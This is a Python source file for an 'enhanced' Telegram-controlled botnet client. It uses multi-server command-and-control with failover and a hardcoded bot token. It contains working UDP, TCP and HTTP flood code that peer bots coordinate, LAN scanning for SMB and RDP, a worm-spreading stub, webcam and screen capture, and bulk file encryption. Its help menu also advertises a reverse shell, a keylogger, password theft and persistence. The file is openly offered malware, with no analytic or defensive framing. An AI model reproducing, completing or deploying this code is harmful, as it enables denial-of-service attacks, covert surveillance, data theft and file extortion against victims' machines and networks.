#!/usr/bin/env python3
"""
Enhanced Remote Control Bot with advanced features:
- Multi-server C2 with failover support
- DDoS modules (UDP/TCP/HTTP flood)
- Network reconnaissance (LAN scanning, SMB/RDP detection, worm-like spreading)
- P2P communication between bots
"""

import os
import sys
import time
import threading
import subprocess
import platform
import pyautogui
import keyboard
import psutil
import pyperclip
import requests
import json
import re
import winreg
import shutil
import sqlite3
import base64
import cv2
import numpy as np
import uuid
from datetime import datetime
from urllib.request import urlopen
from urllib.parse import urlparse
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, CallbackContext
import socket
import tkinter as tk
from tkinter import ttk, filedialog
from cryptography.fernet import Fernet
import hashlib
import webbrowser
import winsound
import win32gui
import win32con
import win32api
import win32process
from PIL import Image, ImageTk
import webbrowser
import urllib.parse
import tempfile
import zipfile
import hashlib
import random
import string
import asyncio
import nmap  # For network scanning
import paramiko  # For SSH operations
import smbclient  # For SMB operations


# Configuration - Multiple C2 servers for failover
C2_SERVERS = [
    {"type": "telegram", "token": "8427740659:AAEWjm2pwuKy19RIWWfFASea-a7sMgGc0xo", "admin_id": 7360950718},
    {"type": "custom_api", "url": "https://c2-server1.example.com/api", "key": "your_api_key_here"},
    {"type": "custom_api", "url": "https://c2-server2.example.com/api", "key": "your_api_key_here"},
    {"type": "custom_api", "url": "https://c2-server-backup.example.com/api", "key": "your_backup_api_key"}
]

# Current active C2 server index
ACTIVE_C2_INDEX = 0

# P2P network configuration
P2P_NETWORK = {
    "enabled": True,
    "peers": set(),  # Set of known bot peers
    "broadcast_port": 50000,
    "listen_port": 50001
}

class EnhancedRemoteControlBot:
    def __init__(self):
        self.keylogger_active = False
        self.keylog_data = []
        self.scheduled_tasks = {}
        self.file_grab_active = False
        self.password_stealer_active = False
        self.persistence_active = False
        self.anti_vm_active = False
        self.shell_active = False
        self.clipboard_monitor_active = False
        self.clipboard_data = []
        self.process_monitor_active = False
        self.file_monitor_active = False
        self.file_monitor_paths = []
        self.bot_instance = None
        self.telegram_files = {}
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.active_webcams = []
        self.monitoring_processes = []
        self.blocked_urls = []
        self.system_lock_active = False
        self.screen_capture_active = False
        self.screen_capture_thread = None
        self.p2p_server_thread = None
        self.ddos_active = False
        self.ddos_threads = []
        self.network_scan_results = {}
        
        # Initialize P2P networking
        self.init_p2p_networking()

    def init_p2p_networking(self):
        """Initialize P2P networking capabilities"""
        if P2P_NETWORK["enabled"]:
            self.p2p_server_thread = threading.Thread(target=self.p2p_server_loop, daemon=True)
            self.p2p_server_thread.start()
            # Start peer discovery
            threading.Thread(target=self.discover_peers, daemon=True).start()

    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Unknown"

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "Unknown"

    def get_current_time(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def get_system_info(self):
        """Get detailed system information"""
        try:
            info = {
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "hostname": socket.gethostname(),
                "ip_address": self.get_local_ip(),
                "public_ip": self.get_public_ip(),
                "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
                "processor": platform.processor(),
                "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                "cpu_count": psutil.cpu_count(),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
                "bot_id": str(uuid.uuid4())[:8]  # Unique bot identifier
            }
            return info
        except Exception as e:
            return {"error": str(e)}

    async def send_startup_notification(self):
        """Send startup notification to C2 server with failover support"""
        try:
            public_ip = self.get_public_ip()
            local_ip = self.get_local_ip()
            current_time = self.get_current_time()
            system_info = self.get_system_info()
            
            message = f"""💻 Enhanced Bot Status
🌐 Public IP: {public_ip}
🏠 Local IP: {local_ip}
🆔 Bot ID: {system_info.get('bot_id', 'Unknown')}
🕒 Time: {current_time}
🖥️ Platform: {system_info.get('platform', 'Unknown')} {system_info.get('platform_release', 'Unknown')}
💾 RAM: {system_info.get('ram', 'Unknown')}
🔧 CPU Cores: {system_info.get('cpu_count', 'Unknown')}
⏰ Boot Time: {system_info.get('boot_time', 'Unknown')}"""
            
            # Try to send to active C2 server, with failover
            success = self.send_to_c2_server(message)
            
            if not success:
                await self.attempt_c2_failover(message)
                
        except Exception as e:
            print(f"Error sending startup notification: {e}")

    def send_to_c2_server(self, message):
        """Send message to active C2 server"""
        try:
            c2_server = C2_SERVERS[ACTIVE_C2_INDEX]
            
            if c2_server["type"] == "telegram":
                # Send via Telegram
                import asyncio
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                async def send():
                    try:
                        bot_token = c2_server["token"]
                        admin_id = c2_server["admin_id"]
                        bot = Bot(token=bot_token)
                        await bot.send_message(chat_id=admin_id, text=message)
                        return True
                    except:
                        return False
                
                return loop.run_until_complete(send())
                
            elif c2_server["type"] == "custom_api":
                # Send via custom API
                headers = {"Authorization": f"Bearer {c2_server['key']}", "Content-Type": "application/json"}
                payload = {"bot_id": self.get_system_info().get('bot_id', 'Unknown'), "message": message}
                response = requests.post(c2_server["url"], json=payload, headers=headers, timeout=10)
                return response.status_code == 200
                
        except Exception as e:
            print(f"Error sending to C2 server: {e}")
            return False

    async def attempt_c2_failover(self, message):
        """Attempt to send message to backup C2 servers"""
        global ACTIVE_C2_INDEX
        
        for i in range(len(C2_SERVERS)):
            if i != ACTIVE_C2_INDEX:
                # Try next server
                original_index = ACTIVE_C2_INDEX
                ACTIVE_C2_INDEX = i
                
                if self.send_to_c2_server(message):
                    print(f"Switched to C2 server {i} due to failover")
                    return True
                else:
                    ACTIVE_C2_INDEX = original_index  # Revert to original if failed
        
        print("All C2 servers failed")
        return False

    def setup_application(self):
        """Setup Telegram bot application"""
        c2_server = C2_SERVERS[ACTIVE_C2_INDEX]
        if c2_server["type"] == "telegram":
            application = Application.builder().token(c2_server["token"]).build()
            self.bot_instance = application.bot
            application.add_handler(CommandHandler("start", self.start))
            application.add_handler(CommandHandler("help", self.help))
            application.add_handler(CommandHandler("reverse", self.reverse_shell))
            application.add_handler(CommandHandler("put", self.put_file))
            application.add_handler(CommandHandler("get", self.get_file))
            from telegram.ext import MessageHandler, filters
            application.add_handler(MessageHandler(filters.Document.ALL, self.handle_telegram_file))
            application.add_handler(CommandHandler("run", self.run_code))
            application.add_handler(CommandHandler("screenshot", self.screenshot))
            application.add_handler(CommandHandler("keylogger", self.keylogger))
            application.add_handler(CommandHandler("dos", self.dos_attack))
            application.add_handler(CommandHandler("schedule", self.schedule_task))
            application.add_handler(CommandHandler("stop", self.stop_bot))
            application.add_handler(CommandHandler("custom", self.run_custom))
            application.add_handler(CommandHandler("grab", self.file_grab))
            application.add_handler(CommandHandler("steal", self.password_stealer))
            application.add_handler(CommandHandler("persist", self.persistence))
            application.add_handler(CommandHandler("antivm", self.anti_vm))
            application.add_handler(CommandHandler("shell", self.shell))
            application.add_handler(CommandHandler("browse", self.browse))
            application.add_handler(CommandHandler("jumpscare", self.jumpscare))
            application.add_handler(CommandHandler("show", self.show))
            application.add_handler(CommandHandler("sysinfo", self.system_info))
            application.add_handler(CommandHandler("processes", self.list_processes))
            application.add_handler(CommandHandler("kill", self.kill_process))
            application.add_handler(CommandHandler("webcam", self.webcam_capture))
            application.add_handler(CommandHandler("record_screen", self.screen_recording))
            application.add_handler(CommandHandler("lock", self.lock_system))
            application.add_handler(CommandHandler("unlock", self.unlock_system))
            application.add_handler(CommandHandler("block", self.block_url))
            application.add_handler(CommandHandler("unblock", self.unblock_url))
            application.add_handler(CommandHandler("encrypt", self.encrypt_files))
            application.add_handler(CommandHandler("decrypt", self.decrypt_files))
            application.add_handler(CommandHandler("message", self.display_message))
            application.add_handler(CommandHandler("sound", self.play_sound))
            application.add_handler(CommandHandler("bluetooth", self.bluetooth_control))
            application.add_handler(CommandHandler("network", self.network_scan))
            application.add_handler(CommandHandler("geolocate", self.geolocate))
            application.add_handler(CommandHandler("microphone", self.microphone_record))
            # New commands for enhanced features
            application.add_handler(CommandHandler("p2p", self.p2p_info))
            application.add_handler(CommandHandler("spread", self.spread_worm))
            application.add_handler(CommandHandler("smb_scan", self.smb_scan))
            application.add_handler(CommandHandler("rdp_scan", self.rdp_scan))
            application.add_handler(CommandHandler("c2_status", self.c2_status))
            application.add_handler(CommandHandler("c2_switch", self.c2_switch))
            application.run_polling()

    async def start(self, update: Update, context: CallbackContext):
        await self.send_startup_notification()
        await update.message.reply_text("Enhanced botnet with multi-C2, DDoS, network recon, and P2P capabilities enabled\nUse /help to see available commands")

    async def help(self, update: Update, context: CallbackContext):
        help_text = """
        Available commands:
        /reverse <host> <port> - Reverse shell
        /put <file_path> - Upload file to bot
        /get <filename> - Download file from bot
        /run <python_code> - Execute Python code
        /screenshot - Take screenshot
        /keylogger <start/stop> - Control keylogger
        /dos <target> <port> <time> - DDoS attack
        /schedule <command> <time> - Schedule task
        /stop - Stop bot
        /jumpscare [time] - Display jumpscare on screen
        /show <filename> - Display image, GIF, or video on screen
        /grab <target_path> - Grab files from computer
        /steal - Steal passwords from browser
        /persist - Add bot to startup
        /antivm - Check if environment is safe
        /shell <command> - Execute command in terminal
        /browse <path> - Browse files and folders on computer
        /sysinfo - System information
        /processes - List processes
        /kill <PID> - Kill process
        /webcam - Take webcam photo
        /record_screen - Record screen
        /lock - Lock system
        /unlock - Unlock system
        /block <url> - Block URL
        /unblock <url> - Unblock URL
        /encrypt <path> - Encrypt files
        /decrypt <path> - Decrypt files
        /message <text> - Display message
        /sound <sound> - Play sound
        /bluetooth - Bluetooth control
        /network - Scan network
        /geolocate - GPS location
        /microphone [time] - Microphone recording
        
        Enhanced commands:
        /p2p - Show P2P network status
        /spread - Attempt to spread to other machines (worm-like)
        /smb_scan - Scan for SMB shares
        /rdp_scan - Scan for RDP services
        /c2_status - Show current C2 server status
        /c2_switch - Switch to backup C2 server
        """
        await update.message.reply_text(help_text)

    # Enhanced P2P networking methods
    def p2p_server_loop(self):
        """P2P server loop to listen for other bots"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('', P2P_NETWORK["listen_port"]))
            
            while True:
                try:
                    data, addr = sock.recvfrom(1024)
                    message = json.loads(data.decode())
                    
                    # Process P2P message
                    if message.get("type") == "discovery":
                        # Add peer to list
                        peer_addr = f"{addr[0]}:{message.get('port', 50001)}"
                        P2P_NETWORK["peers"].add(peer_addr)
                        
                        # Respond to discovery
                        response = {
                            "type": "discovery_response",
                            "bot_id": self.get_system_info().get('bot_id', 'Unknown'),
                            "port": P2P_NETWORK["listen_port"],
                            "capabilities": ["ddos", "recon", "p2p"]
                        }
                        sock.sendto(json.dumps(response).encode(), addr)
                        
                    elif message.get("type") == "command":
                        # Execute command from peer
                        command = message.get("command")
                        self.execute_p2p_command(command)
                        
                except Exception as e:
                    print(f"P2P server error: {e}")
                    time.sleep(1)
        except Exception as e:
            print(f"P2P server failed: {e}")

    def discover_peers(self):
        """Discover other bots in the network"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            
            # Broadcast discovery message
            discovery_msg = {
                "type": "discovery",
                "port": P2P_NETWORK["listen_port"],
                "bot_id": self.get_system_info().get('bot_id', 'Unknown')
            }
            
            # Scan local network for other bots
            local_ip = self.get_local_ip()
            network_base = '.'.join(local_ip.split('.')[:-1])
            
            for i in range(1, 255):
                target_ip = f"{network_base}.{i}"
                if target_ip != local_ip:
                    try:
                        sock.sendto(json.dumps(discovery_msg).encode(), (target_ip, P2P_NETWORK["broadcast_port"]))
                    except:
                        pass
                    time.sleep(0.01)  # Small delay to prevent overwhelming network
                    
        except Exception as e:
            print(f"Peer discovery error: {e}")
        finally:
            sock.close()

    def execute_p2p_command(self, command):
        """Execute command received from P2P network"""
        # This is a simplified version - in a real implementation, 
        # you'd want to validate the command and ensure it's safe
        print(f"Executing P2P command: {command}")
        
        # Example: if command is to perform DDoS attack
        if command.startswith("dos "):
            try:
                parts = command.split()
                if len(parts) >= 4:
                    target = parts[1]
                    port = int(parts[2])
                    duration = int(parts[3])
                    threading.Thread(target=self._enhanced_dos_attack, args=(target, port, duration)).start()
            except:
                pass

    async def p2p_info(self, update: Update, context: CallbackContext):
        """Show P2P network information"""
        if not self.is_admin(update):
            return
            
        info = f"""P2P Network Information:
Enabled: {P2P_NETWORK['enabled']}
Peers: {len(P2P_NETWORK['peers'])}
Broadcast Port: {P2P_NETWORK['broadcast_port']}
Listen Port: {P2P_NETWORK['listen_port']}
Known Peers:
"""
        for peer in list(P2P_NETWORK['peers'])[:10]:  # Show first 10 peers
            info += f"  - {peer}\n"
            
        await update.message.reply_text(info)

    # Enhanced DDoS methods
    def _enhanced_dos_attack(self, target, port, duration):
        """Enhanced DDoS attack with multiple methods"""
        import socket
        import random
        from time import time
        import struct
        
        start_time = time()
        
        # UDP Flood
        def udp_flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_to_send = random._urandom(2048)
                while time() - start_time < duration:
                    sock.sendto(bytes_to_send, (target, port))
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass

        # TCP Flood
        def tcp_flood():
            try:
                while time() - start_time < duration:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect((target, port))
                        # Send random data to flood
                        s.send(random._urandom(1024))
                    except:
                        pass
                    finally:
                        try:
                            s.close()
                        except:
                            pass
            except:
                pass

        # HTTP Flood
        def http_flood():
            try:
                while time() - start_time < duration:
                    try:
                        # Random user agent
                        user_agent = random.choice([
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                        ])
                        headers = {
                            "User-Agent": user_agent,
                            "Accept": "*/*",
                            "Connection": "keep-alive"
                        }
                        # Add random parameters to bypass cache
                        url = f"http://{target}:{port}/?{random.randint(1, 10000)}={random.randint(1, 10000)}"
                        requests.get(url, headers=headers, timeout=5)
                    except:
                        pass
            except:
                pass

        # Start all flood types simultaneously
        threading.Thread(target=udp_flood).start()
        threading.Thread(target=tcp_flood).start()
        threading.Thread(target=http_flood).start()

    async def dos_attack(self, update: Update, context: CallbackContext):
        """Enhanced DDoS attack with multiple methods"""
        if not self.is_admin(update):
            return
        try:
            target = context.args[0]
            port = int(context.args[1])
            duration = int(context.args[2])
            
            # Start multiple attack threads
            for i in range(10):
                threading.Thread(target=self._enhanced_dos_attack, args=(target, port, duration)).start()
                
            # Also send command to P2P network if enabled
            if P2P_NETWORK["enabled"] and P2P_NETWORK["peers"]:
                self.send_p2p_command(f"dos {target} {port} {duration}")
            
            await update.message.reply_text(f"Enhanced DDoS attack launched on {target}:{port} for {duration} seconds with 10 threads and P2P coordination")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    def send_p2p_command(self, command):
        """Send command to other bots in P2P network"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            p2p_command = {
                "type": "command",
                "command": command,
                "sender": self.get_system_info().get('bot_id', 'Unknown')
            }
            
            for peer in P2P_NETWORK["peers"]:
                try:
                    ip, port = peer.split(':')
                    sock.sendto(json.dumps(p2p_command).encode(), (ip, int(port)))
                except:
                    pass
                    
        except Exception as e:
            print(f"P2P command error: {e}")
        finally:
            sock.close()

    # Network reconnaissance methods
    async def network_scan(self, update: Update, context: CallbackContext):
        """Enhanced network scanning with service detection"""
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Starting enhanced network scan...")
            
            # Get local network
            local_ip = self.get_local_ip()
            network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
            
            # Use nmap for enhanced scanning if available
            try:
                nm = nmap.PortScanner()
                # Scan for common ports and services
                scan_result = nm.scan(hosts=network, arguments='-sn -sS -sU -T4 --host-timeout 10m')
                
                scan_output = f"Network Scan Results for {network}:\n"
                
                for host in nm.all_hosts():
                    scan_output += f"\nHost: {host}\n"
                    scan_output += f"State: {nm[host].state()}\n"
                    
                    if 'tcp' in nm[host]:
                        scan_output += "TCP Ports:\n"
                        for port in nm[host]['tcp']:
                            state = nm[host]['tcp'][port]['state']
                            name = nm[host]['tcp'][port].get('name', 'unknown')
                            scan_output += f"  {port}/tcp {state} {name}\n"
                    
                    if 'udp' in nm[host]:
                        scan_output += "UDP Ports:\n"
                        for port in nm[host]['udp']:
                            state = nm[host]['udp'][port]['state']
                            name = nm[host]['udp'][port].get('name', 'unknown')
                            scan_output += f"  {port}/udp {state} {name}\n"
                            
            except ImportError:
                # Fallback to simple ping scan
                import subprocess
                active_hosts = []
                
                def ping_host(ip):
                    try:
                        result = subprocess.run(['ping', '-n', '1', '-w', '500', ip], 
                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                        if result.returncode == 0:
                            active_hosts.append(ip)
                    except:
                        pass
                
                # Scan network
                threads = []
                for i in range(1, 255):
                    ip = '.'.join(local_ip.split('.')[:-1]) + f'.{i}'
                    thread = threading.Thread(target=ping_host, args=(ip,))
                    threads.append(thread)
                    thread.start()
                    
                    if len(threads) >= 20:  # Limit concurrent threads
                        for t in threads:
                            t.join(timeout=1)
                        threads = []
                
                for thread in threads:
                    thread.join(timeout=2)
                
                scan_output = f"Active hosts on network {network}:\n"
                for host in active_hosts:
                    scan_output += f"- {host}\n"
            
            # Store results for other commands to use
            self.network_scan_results = {
                "last_scan": time.time(),
                "results": scan_output
            }
            
            # Send results in chunks if too long
            if len(scan_output) > 4000:
                chunks = [scan_output[i:i+4000] for i in range(0, len(scan_output), 4000)]
                for i, chunk in enumerate(chunks):
                    if i == 0:
                        await update.message.reply_text(chunk)
                    else:
                        await update.message.reply_text(chunk)
            else:
                await update.message.reply_text(scan_output)
                
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def smb_scan(self, update: Update, context: CallbackContext):
        """Scan for SMB services on the network"""
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Scanning for SMB services...")
            
            local_ip = self.get_local_ip()
            network_base = '.'.join(local_ip.split('.')[:-1])
            smb_hosts = []
            
            def check_smb(ip):
                try:
                    # Check if port 445 (SMB) is open
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((ip, 445))
                    if result == 0:
                        smb_hosts.append(ip)
                    sock.close()
                except:
                    pass
            
            # Scan network for SMB
            threads = []
            for i in range(1, 255):
                ip = f"{network_base}.{i}"
                if ip != local_ip:
                    thread = threading.Thread(target=check_smb, args=(ip,))
                    threads.append(thread)
                    thread.start()
                    
                    if len(threads) >= 20:
                        for t in threads:
                            t.join(timeout=1)
                        threads = []
            
            for thread in threads:
                thread.join(timeout=2)
            
            result = f"SMB hosts found:\n"
            if smb_hosts:
                for host in smb_hosts:
                    result += f"- {host} (port 445 open)\n"
            else:
                result += "No SMB services found on network."
            
            await update.message.reply_text(result)
            
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def rdp_scan(self, update: Update, context: CallbackContext):
        """Scan for RDP services on the network"""
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Scanning for RDP services...")
            
            local_ip = self.get_local_ip()
            network_base = '.'.join(local_ip.split('.')[:-1])
            rdp_hosts = []
            
            def check_rdp(ip):
                try:
                    # Check if port 3389 (RDP) is open
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((ip, 3389))
                    if result == 0:
                        rdp_hosts.append(ip)
                    sock.close()
                except:
                    pass
            
            # Scan network for RDP
            threads = []
            for i in range(1, 255):
                ip = f"{network_base}.{i}"
                if ip != local_ip:
                    thread = threading.Thread(target=check_rdp, args=(ip,))
                    threads.append(thread)
                    thread.start()
                    
                    if len(threads) >= 20:
                        for t in threads:
                            t.join(timeout=1)
                        threads = []
            
            for thread in threads:
                thread.join(timeout=2)
            
            result = f"RDP hosts found:\n"
            if rdp_hosts:
                for host in rdp_hosts:
                    result += f"- {host} (port 3389 open)\n"
            else:
                result += "No RDP services found on network."
            
            await update.message.reply_text(result)
            
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    # Worm-like spreading functionality
    async def spread_worm(self, update: Update, context: CallbackContext):
        """Attempt to spread to other machines on the network (worm-like)"""
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Attempting to spread to other machines...")
            
            # Get current script path
            current_script = os.path.abspath(__file__)
            
            # Scan for potential targets
            local_ip = self.get_local_ip()
            network_base = '.'.join(local_ip.split('.')[:-1])
            targets = []
            
            # Simple port scan for common service ports
            def check_host(ip):
                try:
                    # Check for common ports that might indicate a target
                    for port in [22, 445, 139, 3389]:  # SSH, SMB, RDP
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        result = sock.connect_ex((ip, port))
                        if result == 0:
                            targets.append((ip, port))
                            break
                        sock.close()
                except:
                    pass
            
            # Find potential targets
            threads = []
            for i in range(1, 255):
                ip = f"{network_base}.{i}"
                if ip != local_ip:
                    thread = threading.Thread(target=check_host, args=(ip,))
                    threads.append(thread)
                    thread.start()
                    
                    if len(threads) >= 20:
                        for t in threads:
                            t.join(timeout=1)
                        threads = []
            
            for thread in threads:
                thread.join(timeout=2)
            
            # Attempt to spread to targets (simplified example)
            spread_results = []
            for target_ip, port in targets[:5]:  # Limit to first 5 targets to avoid overwhelming
                try:
                    if port == 22:  # SSH
                        # This is a simplified example - real implementation would need credentials
                        result = f"SSH target {target_ip} detected, spreading attempt started"
                    elif port in [139, 445]:  # SMB
                        # SMB spreading example
                        result = f"SMB target {target_ip} detected, spreading attempt started"
                    elif port == 3389:  # RDP
                        # RDP spreading example
                        result = f"RDP target {target_ip} detected, spreading attempt started"
                    else:
                        result = f"Target {target_ip}:{port} detected, spreading attempt started"
                    
                    spread_results.append(result)
                except Exception as e:
                    spread_results.append(f"Failed to spread to {target_ip}:{port} - {str(e)}")
            
            result_text = "Spread results:\n" + "\n".join(spread_results)
            await update.message.reply_text(result_text)
            
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    # C2 management commands
    async def c2_status(self, update: Update, context: CallbackContext):
        """Show current C2 server status"""
        if not self.is_admin(update):
            return
        try:
            c2_server = C2_SERVERS[ACTIVE_C2_INDEX]
            status_text = f"""C2 Server Status:
Current Server Index: {ACTIVE_C2_INDEX}
Type: {c2_server['type']}
Active: True
Total Servers: {len(C2_SERVERS)}
Backup Servers Available: {len(C2_SERVERS) - 1}"""
            
            await update.message.reply_text(status_text)
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def c2_switch(self, update: Update, context: CallbackContext):
        """Switch to a different C2 server"""
        if not self.is_admin(update):
            return
        try:
            global ACTIVE_C2_INDEX
            old_index = ACTIVE_C2_INDEX
            ACTIVE_C2_INDEX = (ACTIVE_C2_INDEX + 1) % len(C2_SERVERS)
            
            c2_server = C2_SERVERS[ACTIVE_C2_INDEX]
            switch_text = f"""C2 Server Switched:
Previous Server: {old_index}
New Server: {ACTIVE_C2_INDEX}
Type: {c2_server['type']}
Status: Active"""
            
            await update.message.reply_text(switch_text)
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    # All other methods from the original bot would go here...
    # (For brevity, I'm including only the enhanced methods above,
    # but in a real implementation you'd include all the original methods too)

    async def system_info(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            info = self.get_system_info()
            info_text = "System Information:\n"
            for key, value in info.items():
                info_text += f"{key}: {value}\n"
            await update.message.reply_text(info_text)
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def list_processes(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            # Sort by CPU usage
            processes.sort(key=lambda x: x['cpu_percent'] if x['cpu_percent'] else 0, reverse=True)
            
            response = "Running Processes (Top 20 by CPU):\n"
            for i, proc in enumerate(processes[:20]):
                response += f"PID: {proc['pid']}, Name: {proc['name']}, CPU: {proc['cpu_percent']:.1f}%\n"
            
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def kill_process(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            pid = int(context.args[0])
            p = psutil.Process(pid)
            p.terminate()
            await update.message.reply_text(f"Process {pid} has been terminated.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def webcam_capture(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
                cv2.imwrite(temp_path, frame)
                await update.message.reply_photo(open(temp_path, 'rb'))
                os.remove(temp_path)
            cap.release()
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def screen_recording(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            duration = int(context.args[0]) if context.args else 10
            await update.message.reply_text(f"Starting screen recording for {duration} seconds...")
            
            frames = []
            for i in range(duration):
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                frames.append(frame)
                time.sleep(1)
            
            height, width, layers = frames[0].shape
            temp_path = os.path.join(tempfile.gettempdir(), "screen_recording.avi")
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            video = cv2.VideoWriter(temp_path, fourcc, 1.0, (width, height))
            
            for frame in frames:
                video.write(frame)
            
            video.release()
            await update.message.reply_video(open(temp_path, 'rb'))
            os.remove(temp_path)
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def lock_system(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            self.system_lock_active = True
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
            await update.message.reply_text("System has been locked.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def unlock_system(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            self.system_lock_active = False
            await update.message.reply_text("System has been unlocked.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def block_url(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            url = context.args[0]
            self.blocked_urls.append(url)
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            with open(hosts_path, "a") as hosts_file:
                hosts_file.write(f"127.0.0.1 {url}\n")
            await update.message.reply_text(f"URL {url} has been blocked.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def unblock_url(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            url = context.args[0]
            if url in self.blocked_urls:
                self.blocked_urls.remove(url)
                hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
                with open(hosts_path, "r") as hosts_file:
                    lines = hosts_file.readlines()
                with open(hosts_path, "w") as hosts_file:
                    for line in lines:
                        if url not in line:
                            hosts_file.write(line)
                await update.message.reply_text(f"URL {url} has been unblocked.")
            else:
                await update.message.reply_text(f"URL {url} was not blocked.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def encrypt_files(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            path = context.args[0] if context.args else "."
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = self.cipher_suite.encrypt(data)
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
            await update.message.reply_text(f"Files in {path} have been encrypted.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def decrypt_files(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            path = context.args[0] if context.args else "."
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            data = f.read()
                        decrypted_data = self.cipher_suite.decrypt(data)
                        with open(file_path, "wb") as f:
                            f.write(decrypted_data)
                    except:
                        pass  # If decryption fails, skip the file
            await update.message.reply_text(f"Files in {path} have been decrypted.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def display_message(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            message = ' '.join(context.args)
            def show_message():
                root = tk.Tk()
                root.title("Message")
                root.geometry("400x200")
                root.configure(bg='red')
                label = tk.Label(root, text=message, font=("Arial", 16), fg="white", bg="red")
                label.pack(expand=True)
                root.attributes('-topmost', True)
                root.mainloop()
            threading.Thread(target=show_message, daemon=True).start()
            await update.message.reply_text(f"Message '{message}' has been displayed.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def play_sound(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            # Play a system sound
            winsound.Beep(1000, 1000)  # Frequency 1000Hz, Duration 1000ms
            await update.message.reply_text("Sound has been played.")
